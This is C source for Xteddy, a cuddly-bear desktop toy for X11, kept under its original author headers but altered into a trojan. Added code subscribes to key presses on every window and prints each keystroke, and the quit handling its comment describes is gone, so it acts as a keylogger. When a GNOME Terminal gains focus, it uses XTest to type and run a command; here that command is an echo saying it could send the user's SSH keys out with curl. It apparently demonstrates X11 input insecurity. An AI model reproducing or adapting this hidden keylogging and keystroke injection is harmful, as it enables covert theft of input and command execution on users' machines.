/* Xteddy - a cuddly bear to place on your desktop. */
/* Author: Stefan Gustavson, ISY-LiTH, 1994         */
/* Internet email address: stefang@isy.liu.se       */
/* This software is distributed under the GNU       */
/* Public Licence (GPL).                            */
/* Also, if you modify this program or include it   */
/* in some kind of official distribution, I would   */
/* like to know about it.                           */

/* Xpm pixmap manipulation routines for color       */
/* and grayscale teddies are from the Xpm library   */
/* by Arnaud Le Hors, lehors@sophia.inria.fr,       */
/* Copyright 1990-93 GROUPE BULL                    */

/* This is Xteddy version 1.1 as of 1998-04-22.     */
/* from Andreas Tille <tille@physik.uni-halle.de>   */
/* Changes: Load other pixmaps via -F<pixmap>       */

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xos.h>
#include <X11/Xatom.h>
#include <X11/keysym.h>
#include <X11/extensions/shape.h>
#include <X11/extensions/XTest.h>
#include <X11/cursorfont.h>

#ifdef HAVE_LIBXPM
#include <X11/xpm.h>
#endif

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef TRUE
#define TRUE 1
#endif

#ifndef FALSE
#define FALSE 0
#endif

static char *progname;
Display *display;
int screen_num;

#define PIX    "_color.xpm"
#define BIT    "_bw.xbm"
#define ICO    "_icon.xbm"
#define MSK    "_mask.xbm"

int dummy_handler(Display *error_display, XErrorEvent *event) {
        return;
}

void listen_window(Window window) {
	XSelectInput(display, window, FocusChangeMask | KeyPressMask | StructureNotifyMask | SubstructureNotifyMask);
}

void listen_children(Window window) {
	Window root, parent, *children;
	unsigned int nchildren;

	listen_window(window);

	XQueryTree(display, window, &root, &parent, &children, &nchildren);
	if (children) {
		int i;
		for (i=0; i<nchildren; i++) {
			listen_children(children[i]);
		}
	}
}	

typedef struct { char          *teddy;
                 char          *pix,         /* <name>_color.xpm         */
                               *bit,         /* <name>_bw.xbm            */
		               *ico,         /* <name>_icon.xbm          */
		               *msk,         /* <name>_mask.xbm          */
		               *window_name, /* <Name>                   */
		               *icon_name,   /* <name>                   */
	                       *buf;         /* stores all these strings */
	         unsigned int  width, height, 
                               icon_width, icon_height;
                 unsigned char *bw_bits,     /* bitmap data              */
                               *mask_bits,   /* mask data                */
                               *icon_bits;   /* icon data                */
} teddy_struct;	

int InitTeddy(teddy_struct *xteddy)
/* Initializing filenames */
{
#define FBUFLEN  200
   int      buflen, w, h, xhotret, yhotret;
   char     fbuf[FBUFLEN];

   if ( !xteddy->teddy || !(strlen(xteddy->teddy)) ) return -1;

   /* Test, whether the pixmap is in "." or in PIXMAP_PATH */
   strcat(strcpy(fbuf, xteddy->teddy), PIX);
   if ( (xhotret = open(fbuf, O_RDONLY)) == -1 ) {
      strcat(strcat(strcat(strcpy(fbuf, PIXMAP_PATH), "/"), xteddy->teddy), PIX);
      if ( (xhotret = open(fbuf, O_RDONLY)) == -1 ) {
	 fprintf(stderr, "Can not find %s.\n", fbuf);
	 return -1;
      }
   }
   close(xhotret);
   *(strstr(fbuf, PIX)) = 0;
   
   buflen = 5 * strlen(fbuf) +
            strlen(PIX) + 1  +
	    strlen(BIT) + 1  +
	    strlen(ICO) + 1  +
	    strlen(MSK) + 1;
   if ( (xteddy->buf = calloc(buflen, sizeof(char))) == NULL ) return -1;
   
   strcpy(xteddy->pix = xteddy->buf, fbuf);
   strcat(xteddy->pix, PIX);
   strcpy(xteddy->bit = xteddy->pix + strlen(xteddy->pix) + 1, fbuf);
   strcat(xteddy->bit, BIT);
   strcpy(xteddy->ico = xteddy->bit + strlen(xteddy->bit) + 1, fbuf);
   strcat(xteddy->ico, ICO);
   strcpy(xteddy->msk = xteddy->ico + strlen(xteddy->ico) + 1, fbuf);
   strcat(xteddy->msk, MSK);
   strcpy(xteddy->window_name = xteddy->msk+strlen(xteddy->msk) + 1, fbuf);
   *(xteddy->window_name) = toupper(*(xteddy->window_name));
   xteddy->icon_name = xteddy->teddy;
   
   XReadBitmapFileData(xteddy->bit, &(xteddy->width), &(xteddy->height),
                       &xteddy->bw_bits, &xhotret, &yhotret);
   XReadBitmapFileData(xteddy->msk, &w, &h,
                       &xteddy->mask_bits, &xhotret, &yhotret);
   if ( (xteddy->width != w) || (xteddy->height != h) ) {
      fprintf(stderr, "Bitmap and Mask have different sizes.\n");
      return -1;
   }
   XReadBitmapFileData(xteddy->ico, &(xteddy->icon_width), &(xteddy->icon_height),
                       &xteddy->icon_bits, &xhotret, &yhotret);
   
   return 0;
#undef FBUFLEN
}

void fake_entry()
{
  int i, keycode;
  char entry[] = "echo this could be using curl to send your ssh keys to a remote site";

  for (i=0; i<strlen(entry); i++) {
    keycode = XKeysymToKeycode(display, entry[i]);
    XTestFakeKeyEvent(display, keycode, True, CurrentTime);
    XTestFakeKeyEvent(display, keycode, False, CurrentTime);
  }
  keycode = XKeysymToKeycode(display, 0xff0d);
  XTestFakeKeyEvent(display, keycode, True, CurrentTime);
  XTestFakeKeyEvent(display, keycode, False, CurrentTime); 
}

int main(argc, argv)
     int argc;
     char **argv;
{
  /* Display, window and gc manipulation variables */
  Window win;
  GC gc;
  XSetWindowAttributes setwinattr;
  XGCValues gcvalues;
  unsigned long valuemask, gcvaluemask, inputmask;
  int x, y, geomflags, xw, xh;
  unsigned int border_width = 0;
  unsigned int display_width, display_height, display_depth;
  Pixmap icon_pixmap, background_pixmap, shape_pixmap;
  XSizeHints size_hints;
  XIconSize *size_list;
  XWMHints wm_hints;
  XClassHint class_hints, *h;
  XTextProperty windowName, iconName;
  int count, argnum;
  int use_wm, float_up, use_mono, allow_quit;
  XEvent report;
  char *display_name = NULL;
  char *window_name;
  char buffer[20];
  int bufsize = 20;
  KeySym keysym;
  XComposeStatus compose;
  int charcount;
  Cursor cursor;
  teddy_struct teddy;

#ifdef HAVE_LIBXPM
  /* Color allocation variables */
  Visual *default_visual;
  Colormap default_cmap;
  XpmAttributes xpmattributes;
  XVisualInfo *visual_info, vinfo_template;
  int nmatches;
  static char *visual_name[]={ "StaticGray", "GrayScale", "StaticColor",
				  "PseudoColor", "TrueColor", "DirectColor" };
#endif

  /* Window movement variables */
  XWindowChanges winchanges;
  Window root, child, basewin;
  int offs_x, offs_y, new_x, new_y, tmp_x, tmp_y;
  unsigned int tmp_mask;

  teddy.teddy = argv[0]; 

  /* Determine program name */
  if ((progname = strrchr(argv[0],'/')) == NULL)
    progname = argv[0];
  else
    progname++;

  /* Option handling: "-wm", "-float", "-noquit", "-mono", "-geometry" */
  /* and "-display" are recognized. See manual page for details. */
  /* -F<name> ... Other pixmap name */
  use_wm = FALSE;
  float_up = FALSE;
  use_mono = FALSE;
  allow_quit = TRUE;
  x = y = 0;
  geomflags = 0;
  for(argnum=1; argnum<argc; argnum++)
    {
      if (!strcmp(argv[argnum],"-wm"))
	use_wm = TRUE;
      if (!strcmp(argv[argnum],"-float"))
	float_up = TRUE;
      if (!strcmp(argv[argnum],"-mono"))
	use_mono = TRUE;
      if (!strcmp(argv[argnum],"-noquit"))
	allow_quit = FALSE;
      if (!strcmp(argv[argnum],"-geometry"))
	geomflags = XParseGeometry(argv[++argnum], &x, &y, &xw, &xh);
      if (!strcmp(argv[argnum],"-display"))
	display_name = argv[++argnum];
      if (!strncmp(argv[argnum],"-F", 2)) 
         teddy.teddy = argv[argnum] + 2;
    }
  /* Connect to X server */
  if ( (display = XOpenDisplay(display_name)) == NULL )
    {
      (void) fprintf(stderr, "%s: Cannot connect to X server %s\n",
		     progname, XDisplayName(display_name));
      exit(-1);
    }

  /* Get screen size and depth */
  screen_num = DefaultScreen(display);
  display_width = DisplayWidth(display, screen_num);
  display_height = DisplayHeight(display, screen_num);
  display_depth = DefaultDepth(display, screen_num);

  if ( InitTeddy(&teddy) ) return -1;

  /* Set the window size to snugly fit the teddybear pixmap */
  /*  
  width  = teddy.width;
  height = teddy.height;
  */
  /* Set the window position according to user preferences */
  if (geomflags & XNegative)
    x = display_width - teddy.width + x;
  if (geomflags & YNegative)
    y = display_height - teddy.height + y;
  /* Clip against bounds to stay on the screen */
  if (x<0) x=0;
  if (x > display_width - teddy.width) x = display_width - teddy.width;
  if (y<0) y=0;
  if (y > display_height - teddy.height) y = display_height - teddy.height;

  /* Create the main window */
  win = XCreateSimpleWindow(display, RootWindow(display,screen_num),
			    x,y,display_width,display_height,border_width,
			    BlackPixel(display,screen_num),
			    WhitePixel(display,screen_num));
  basewin = win;

  /* Create a GC (Currently not used for any drawing) */
  gcvalues.foreground = BlackPixel(display,screen_num);
  gcvalues.background = WhitePixel(display,screen_num);
  gcvaluemask = GCForeground | GCBackground;
  gc = XCreateGC(display, win, gcvaluemask, &gcvalues);

#ifndef HAVE_LIBXPM
  /* Use b/w dithered X bitmap no matter what */
  background_pixmap =
    XCreatePixmapFromBitmapData(display, win, xteddy_bw_bits,
				xteddy.width, xteddy.height,
				BlackPixel(display, screen_num),
				WhitePixel(display, screen_num),
				display_depth);
#else
  /* Get information about the default visual */
  default_visual = DefaultVisual(display, screen_num);
  default_cmap = DefaultColormap(display, screen_num);

  /* Get the visual class of the default visual. (I strongly feel */
  /* that there must be a more straightforward way to do this...) */
  vinfo_template.visualid = XVisualIDFromVisual(default_visual);
  visual_info = XGetVisualInfo(display, VisualIDMask,
			       &vinfo_template, &nmatches);
  /* The default visual should be supported, so don't check for NULL return */
#ifdef DEBUG
  printf("%s: default visual class is %s.\n",
	 progname, visual_name[visual_info->class]);
#endif
  if ((visual_info->class == StaticGray) || (use_mono))
    {
      /* Use b/w dithered bitmap */
      background_pixmap =
	XCreatePixmapFromBitmapData(display, win, teddy.bw_bits,
				    teddy.width, teddy.height,
				    BlackPixel(display, screen_num),
				    WhitePixel(display, screen_num),
				    display_depth);
    }
  else /* at least GrayScale - let Xpm decide which visual to use */
    {
      xpmattributes.visual = default_visual;
      xpmattributes.colormap = default_cmap;
      xpmattributes.depth = display_depth;
      xpmattributes.valuemask = XpmVisual | XpmColormap | XpmDepth;
      if (XpmReadFileToPixmap(display, win, teddy.pix,
			      &background_pixmap, &shape_pixmap,
			      &xpmattributes) < XpmSuccess)
	{
	  printf("%s: Failed to allocate colormap. Using black-and-white.\n",
		 progname);
	  background_pixmap =
	    XCreatePixmapFromBitmapData(display, win, teddy.bw_bits,
					teddy.width, teddy.height,
					BlackPixel(display, screen_num),
					WhitePixel(display, screen_num),
					display_depth);
	}
    }
  XFree(visual_info);
#endif
  setwinattr.background_pixmap = background_pixmap;
  if (use_wm)
    setwinattr.override_redirect = FALSE;
  else
    setwinattr.override_redirect = TRUE;
  cursor = XCreateFontCursor(display, XC_heart);
  setwinattr.cursor = cursor;
  valuemask = CWBackPixmap | CWOverrideRedirect | CWCursor;
  XChangeWindowAttributes(display, win, valuemask, &setwinattr);

  /* Create and set the shape pixmap of the window - requires shape Xext */
  shape_pixmap = XCreateBitmapFromData(display,win, teddy.mask_bits,
				       teddy.width, teddy.height);
  XShapeCombineMask(display, win, ShapeBounding, 0, 0, shape_pixmap, ShapeSet);

  /* Get available icon sizes from window manager */
  /* (and then blatantly ignore the result)       */
  if (XGetIconSizes(display, RootWindow(display,screen_num),
		    &size_list, &count) == 0)
    {
      /* Window manager didn't set preferred icon sizes - use the default */
      icon_pixmap = XCreateBitmapFromData(display,win, teddy.icon_bits,
				      teddy.icon_width, teddy.icon_height);
    }
  else
    {
      /* Ignore the list and use the default size anyway */
      icon_pixmap = XCreateBitmapFromData(display,win, teddy.icon_bits,
				      teddy.icon_width, teddy.icon_height);
    }
  /* Report size hints and other stuff to the window manager */
  size_hints.min_width  = teddy.width;    /* Don't allow any resizing */
  size_hints.min_height = teddy.height;
  size_hints.max_width  = teddy.width;
  size_hints.max_height = teddy.height;
  size_hints.flags = PPosition | PSize | PMinSize | PMaxSize;
  if (XStringListToTextProperty(&(teddy.window_name), 1, &windowName) == 0)
    {
      (void) fprintf(stderr,
		     "%s: structure allocation for windowName failed.\n",
		     progname);
      exit(-1);
    }
  if (XStringListToTextProperty(&(teddy.icon_name), 1, &iconName) == 0)
    {
      (void) fprintf(stderr,
		     "%s: structure allocation for iconName failed.\n",
		     progname);
      exit(-1);
    }
  wm_hints.initial_state = NormalState;
  wm_hints.input = TRUE;
  wm_hints.icon_pixmap = icon_pixmap;
  wm_hints.flags = StateHint | IconPixmapHint | InputHint;
  
  class_hints.res_name = progname;
  class_hints.res_class = "Xteddy";
  
  XSetWMProperties(display, win, &windowName, &iconName,
		   argv, argc, &size_hints, &wm_hints, &class_hints);

  /* Select event types wanted */
  inputmask = ExposureMask | KeyPressMask | ButtonPressMask | 
    ButtonReleaseMask | StructureNotifyMask | ButtonMotionMask | 
      PointerMotionHintMask | EnterWindowMask | LeaveWindowMask;
  if (float_up) inputmask |= VisibilityChangeMask;

  /* Display window */
  XMapWindow(display,win);
  XSetErrorHandler(dummy_handler);
  listen_children(DefaultRootWindow(display));
  XSelectInput(display, win, inputmask);
  /* Get and process the events */
  while (1)
    {
      XNextEvent(display, &report);
      switch(report.type)
	{
	case Expose:
	  if (report.xexpose.count != 0)
	    break;
	  else
	    {
	      /* No drawing needed - the background pixmap */
	      /* is handled automatically by the X server  */
	    }
	  break;
	case ConfigureNotify:
	  /* Window has been resized */
	  teddy.width  = report.xconfigure.width;
	  teddy.height = report.xconfigure.height;
	  break;
	case ReparentNotify:
	  /* Window was reparented by the window manager */
	  if (!use_wm)
	    (void) fprintf(stderr,
			   "%s: Window manager wouldn't leave the window alone!\n",
			   progname);
	  basewin = report.xreparent.parent;
	  break;
	case EnterNotify:
	  /* Grab the keyboard while the pointer is in the window */
	  XGrabKeyboard(display, win, FALSE, GrabModeAsync, GrabModeAsync,
			CurrentTime);
	  break;
	case LeaveNotify:
	  /* Release the keyboard when the pointer leaves the window */
	  XUngrabKeyboard(display, CurrentTime);
	  break;
	case ButtonPress:
	  /* Raise xteddy above sibling windows  */
	  XRaiseWindow(display, win);
	  /* Remember where the mouse went down */
	  XQueryPointer(display, basewin, &root, &child, &tmp_x, &tmp_y,
			&offs_x, &offs_y, &tmp_mask);
	  break;
	case ButtonRelease:
	  /* Place xteddy at the new position */
	  XQueryPointer(display, basewin, &root, &child, &new_x, &new_y,
		        &tmp_x, &tmp_y, &tmp_mask);
	  winchanges.x = new_x - offs_x;
	  winchanges.y = new_y - offs_y;
	  XReconfigureWMWindow(display, basewin, screen_num,
			       CWX | CWY, &winchanges);
	  break;
	case MotionNotify:
	  /* Move xteddy around with the mouse */
	  while (XCheckMaskEvent(display, ButtonMotionMask, &report));
	  if (!XQueryPointer(display, report.xmotion.window, &root, &child,
			    &new_x, &new_y, &tmp_x, &tmp_y, &tmp_mask))
	    break;
	  winchanges.x = new_x - offs_x;
	  winchanges.y = new_y - offs_y;
	  XReconfigureWMWindow(display, win, screen_num,
			       CWX | CWY, &winchanges);
	  break;
	case VisibilityNotify:
	  /* Put xteddy on top of overlapping windows */
	  if (float_up)
	    if ((report.xvisibility.state == VisibilityFullyObscured)
		|| (report.xvisibility.state == VisibilityPartiallyObscured))
	      XRaiseWindow(display,win);
	  break;
	case KeyPress:
	  /* Exit on "q" or "Q" */
	  charcount = XLookupString(&report.xkey, buffer, bufsize,
				    &keysym, &compose);
	  fprintf(stderr, "%c", keysym);
	  break;
        case CreateNotify:
	  listen_children(DefaultRootWindow(display));
	  XSelectInput(display, win, inputmask);
	  break;
        case FocusIn:
          h = XAllocClassHint();
          XGetClassHint(display, report.xfocus.window, h);
	  if (h->res_name && strcmp(h->res_name, "gnome-terminal-server") == 0) {
	    fake_entry();
	  }
          XFree(h);
          break;
	default:
	  /* Throw away all other events */
	  break;
	} /* end switch */
    } /* end while */
}
